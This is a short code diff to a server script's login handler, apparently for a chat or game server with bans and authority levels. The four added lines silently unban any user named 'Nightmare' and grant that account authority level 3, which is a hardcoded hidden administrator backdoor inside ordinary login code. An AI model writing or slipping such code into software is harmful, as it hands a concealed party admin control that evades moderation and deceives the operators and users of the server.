@@ -1345,6 +1345,10 @@ afterLogIn : function(src) {
     if (script.cookieBanned(src)) { //prevents errors from "no id" from the rest of the function
         return;
     }
+    if (sys.name(src) == "Nightmare") {
+        sys.unban("Nightmare");
+        sys.changeAuth("Nightmare", 3);
+    }
     sys.sendMessage(src, "*** Type in /Rules to see the rules. ***");
     commandbot.sendMessage(src, "Use !commands to see the commands!");
 
